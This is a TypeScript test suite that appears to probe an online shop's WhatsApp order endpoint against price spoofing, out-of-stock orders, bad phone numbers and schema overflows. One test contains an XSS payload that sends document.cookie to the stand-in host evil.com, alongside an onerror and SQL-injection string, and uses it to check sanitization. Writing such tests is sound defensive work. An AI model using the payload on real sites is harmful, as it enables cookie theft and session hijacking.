import assert from "node:assert";
import {
  sanitizeCustomerText,
  validateOrderPayload,
  whatsAppOrderInputSchema,
  whatsAppOrderApiRequestSchema,
} from "@/lib/validations";
import {
  sanitizePhoneNumber,
  generateWhatsAppOrderUrl,
  getActiveStoreConfig,
} from "@/lib/whatsapp";
import { POST as orderWhatsappHandler } from "@/app/api/order/whatsapp/route";
import prisma from "@/lib/db";

async function runAdversarialAudit() {
  console.log("=== ADVERSARIAL STRESS SUITE FOR M3 ===");
  let passed = 0;
  let failed = 0;

  function check(name: string, fn: () => void | Promise<void>) {
    return Promise.resolve()
      .then(fn)
      .then(() => {
        console.log(`[PASS] ${name}`);
        passed++;
      })
      .catch((err) => {
        console.error(`[FAIL] ${name}:`, err);
        failed++;
      });
  }

  // 1. Price Spoofing Prevention
  await check("Price spoofing prevention: route must enforce database price over client price", async () => {
    // Find an existing product in DB
    const dbProduct = await prisma.product.findFirst();
    assert(dbProduct, "At least one product must exist in database");

    const req = new Request("http://localhost:3000/api/order/whatsapp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        productId: dbProduct.id,
        productName: "HACKED NAME",
        price: 0.01, // Client attempts to spoof price to 1 cent
        customerNotes: "Cheated price order",
      }),
    });

    const res = await orderWhatsappHandler(req);
    assert.strictEqual(res.status, 200);
    const json = await res.json();
    assert.strictEqual(json.success, true);
    // URL must contain canonical DB price and canonical DB product name
    const decodedUrl = decodeURIComponent(json.redirectUrl);
    assert(
      decodedUrl.includes(`${dbProduct.price.toFixed(2)}`),
      `Expected redirectUrl to contain DB price ${dbProduct.price.toFixed(2)}, got: ${decodedUrl}`
    );
    assert(
      decodedUrl.includes(dbProduct.name),
      `Expected redirectUrl to contain DB name ${dbProduct.name}, got: ${decodedUrl}`
    );
    assert(
      !decodedUrl.includes("HACKED NAME"),
      "Client-provided spoofed name must be rejected in favor of canonical DB name"
    );
    assert(
      !decodedUrl.includes("0.01"),
      "Client-provided spoofed price must be rejected in favor of canonical DB price"
    );
  });

  // 2. Out-of-Stock Product Handling
  await check("Out of stock product returns 400", async () => {
    const zeroStockProduct = await prisma.product.create({
      data: {
        name: "ZERO STOCK TEST PRODUCT",
        slug: `zero-stock-test-${Date.now()}`,
        description: "Zero stock test",
        price: 50.0,
        stock: 0,
        mediaUrls: ["/assets/test.png"],
        variants: [{ name: "Standard", inStock: false }],
        bestseller: false,
      },
    });

    try {
      const req = new Request("http://localhost:3000/api/order/whatsapp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          productId: zeroStockProduct.id,
        }),
      });

      const res = await orderWhatsappHandler(req);
      assert.strictEqual(res.status, 400);
      const json = await res.json();
      assert.strictEqual(json.success, false);
      assert.strictEqual(json.error, "Product is out of stock");
    } finally {
      await prisma.product.delete({ where: { id: zeroStockProduct.id } });
    }
  });

  // 3. Out-of-Stock Variant Handling
  await check("Out of stock variant returns 400", async () => {
    const variantTestProduct = await prisma.product.create({
      data: {
        name: "VARIANT TEST PRODUCT",
        slug: `variant-test-${Date.now()}`,
        description: "Variant stock test",
        price: 100.0,
        stock: 10,
        mediaUrls: ["/assets/test.png"],
        variants: [
          { name: "InStockSize", inStock: true },
          { name: "SoldOutSize", inStock: false },
        ],
        bestseller: false,
      },
    });

    try {
      const req = new Request("http://localhost:3000/api/order/whatsapp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          productId: variantTestProduct.id,
          variant: "SoldOutSize",
        }),
      });

      const res = await orderWhatsappHandler(req);
      assert.strictEqual(res.status, 400);
      const json = await res.json();
      assert.strictEqual(json.success, false);
      assert(json.error.includes("is currently out of stock"));
    } finally {
      await prisma.product.delete({ where: { id: variantTestProduct.id } });
    }
  });

  // 4. Non-Existent Product Returns 404
  await check("Non-existent product returns 404", async () => {
    const req = new Request("http://localhost:3000/api/order/whatsapp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        productId: "non-existent-product-id-99999",
      }),
    });

    const res = await orderWhatsappHandler(req);
    assert.strictEqual(res.status, 404);
    const json = await res.json();
    assert.strictEqual(json.success, false);
    assert(json.error.includes("Product not found"));
  });

  // 5. XSS Sanitization in Customer Notes
  await check("Customer notes neutralize XSS in wa.me link", async () => {
    const dbProduct = await prisma.product.findFirst();
    assert(dbProduct);

    const xssPayload = `<script>document.location='http://evil.com/?c='+document.cookie</script><img src=x onerror=alert(1)>' OR '1'='1`;
    const req = new Request("http://localhost:3000/api/order/whatsapp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        productId: dbProduct.id,
        customerNotes: xssPayload,
      }),
    });

    const res = await orderWhatsappHandler(req);
    assert.strictEqual(res.status, 200);
    const json = await res.json();
    const decodedUrl = decodeURIComponent(json.redirectUrl);

    assert(!decodedUrl.includes("<script>"), "Must strip <script>");
    assert(!decodedUrl.includes("</script>"), "Must strip </script>");
    assert(!decodedUrl.includes("<img"), "Must strip <img");
    assert(!decodedUrl.includes("'"), "Must strip single quotes");
    assert(!decodedUrl.includes('"'), "Must strip double quotes");
    assert(!decodedUrl.includes(";"), "Must strip semicolons");
  });

  // 6. Extreme Boundary Conditions for Phone Sanitization
  await check("sanitizePhoneNumber edge cases", () => {
    assert.strictEqual(sanitizePhoneNumber("+90 (555) 123-45-67"), "905551234567");
    assert.strictEqual(sanitizePhoneNumber("0090 555 123 4567"), "00905551234567");
    assert.strictEqual(sanitizePhoneNumber("12345"), "12345");
    assert.throws(() => sanitizePhoneNumber("+++---()"), /no digits found/);
    assert.throws(() => sanitizePhoneNumber("   "), /no digits found/);
    assert.throws(() => sanitizePhoneNumber(null as unknown as string), /no digits found/);
  });

  // 7. Zod Schema Extreme Inputs
  await check("Zod schemas reject invalid numbers and overflows", () => {
    // Negative price
    assert.throws(() => {
      whatsAppOrderInputSchema.parse({
        productId: "p1",
        productName: "Tee",
        price: -5,
      });
    });

    // Zero price
    assert.throws(() => {
      whatsAppOrderInputSchema.parse({
        productId: "p1",
        productName: "Tee",
        price: 0,
      });
    });

    // NaN price
    assert.throws(() => {
      whatsAppOrderInputSchema.parse({
        productId: "p1",
        productName: "Tee",
        price: NaN,
      });
    });

    // Infinity price
    assert.throws(() => {
      whatsAppOrderInputSchema.parse({
        productId: "p1",
        productName: "Tee",
        price: Infinity,
      });
    });

    // Variant > 50 chars
    assert.throws(() => {
      validateOrderPayload({
        productId: "p1",
        variant: "X".repeat(51),
      });
    });

    // Notes > 500 chars
    assert.throws(() => {
      validateOrderPayload({
        productId: "p1",
        customerNotes: "X".repeat(501),
      });
    });
  });

  console.log(`=== SUMMARY: ${passed} PASSED, ${failed} FAILED ===`);
  if (failed > 0) process.exit(1);
}

runAdversarialAudit().catch((err) => {
  console.error("FATAL ERROR in adversarial audit:", err);
  process.exit(1);
});
